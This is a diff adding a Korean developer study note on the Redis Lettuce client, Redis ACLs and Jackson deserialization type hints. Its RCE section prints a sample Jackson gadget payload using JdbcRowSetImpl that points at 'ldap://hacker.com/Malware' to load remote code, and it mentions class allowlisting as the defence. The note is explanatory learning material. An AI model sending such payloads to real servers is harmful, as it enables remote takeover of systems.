@@ -2393,3 +2393,54 @@ TCP -> WebSocket handler -> client in-bound channel -> (channel interceptor) -> 
 
 
 </details>
+
+<details>
+<summary>2026-07-15</summary>
+
+- `Redis in Java`  
+`Lettuce` 는 `Redis` 의 non-blocking client library, `netty` 기반.  
+이론상 connection 을 하나만 가져도 된다.  
+왜냐 redis 는 단일 스레드이다.  
+하지만 여러 connection 이 필요한 경우가 있다.  
+예를 들어 보내는 데이터가 너무 크거나 bandwidth 한계에 도달하면 병렬로 분산해야 한다.  
+lettuce 는 비동기이지만 blocking 작업이 필요하면 이를 위한 connection pool 을 만들어야 한다.  
+또한 tx 을 사용할 때는 반드시 하나의 스레드가 하나의 connection 을 점유해야 한다.
+- `Redis` 최신 버전은 username, password 가 존재한다(6 버전부터 access control list 지원).  
+하위 호환성과 편의성 때문에 password 하나만 거는 방식을 많이 사용한다.
+- `RCE, Remote Code Execution`  
+원격으로 서버의 코드를 마음대로 실행하는 공격이다.  
+데이터를 탈취하는 것이 아니다.  
+예를 들어 해커가 다음과 같은 json 을 redis 에 보낸다.  
+```json
+{
+  "@class": "com.sun.rowset.JdbcRowSetImpl",  // 서버 내부에 존재하는 위험한 클래스를 지목
+  "dataSourceName": "ldap://hacker.com/Malware", // 해커 서버의 악성코드 주소
+  "autoCommit": true
+}
+
+```
+`JdbcRowSetImpl` 은 역직렬화할 때 `dataSourceName` 주소로 연결하는 로직이 있다.  
+이러면 악성 코드를 다운받아 실행하게 되어 서버를 장악할 수 있다.  
+이것을 막기 위해 안전하다고 허용된 패키지의 클래스 이름이 아니면 역직렬화를 거부할 수 있는 기능이 있다.
+- `Jackson` 역/직렬화 과정  
+jackson 은 springboot 에 내장되어 있다.  
+여담으로 `Gson` 도 역/직렬화를 하지만 주로 모바일 등 network i/o 가 중요한 곳에서 가볍게 사용할 때 사용된다(`Jackson`은 무겁다).  
+어떤 객체를 직렬화할 때 내부 field 의 타입에 따라 달라진다.  
+구현체 클래스, primitive type 은 괜찮다.  
+문제는 `Object`, `interface`, `abstract class` 이다.  
+이것들은 실제 구현체가 뭔지 모른다.  
+그래서 역직렬화할 때 어떤 클래스로 만들어줘야 하는지 모른다.  
+이런 모호한 경우 json 에 hint 로 어떤 클래스인지 저장한다.  
+역직렬화 시 이걸 보고 객체를 만들어 준다.  
+또 다른 문제는 앞서 말한 모호한 타입들, `Object`, `interface`, `abstract class` 의 실제 구현체가 `final class` 인 경우이다.  
+실제 클래스가 뭔지 json 에 기록하려고 할 때 `record`, `enum` 과 같이 `final class` 인 경우 hint 를 적지 않는다(보안상 이유).  
+그래서 역직렬화 시 문제가 생긴다.  
+이런 경우 반드시 `@JsonTypeInfo` 를 붙여야 한다.
+- 역/직렬화의 철학 중 하나는 모호할 때 반드시 힌트를 추가한다는 것이다.  
+`Jackson` 의 철학 중 하나는 실용성과 보안을 중요시 한다는 것이다.  
+json 에 직렬화한 타입의 정보를 모두 기록하면 json 크기가 커진다.  
+그래서 꼭 필요한 경우만 힌트를 추가하는 것이다.  
+- 역/직렬화 시 reflection 이 사용된다.  
+매번 사용하지 않고 역/직렬화되는 타입을 최초 1회만 사용하고 캐시에 저장한다.
+
+</details>
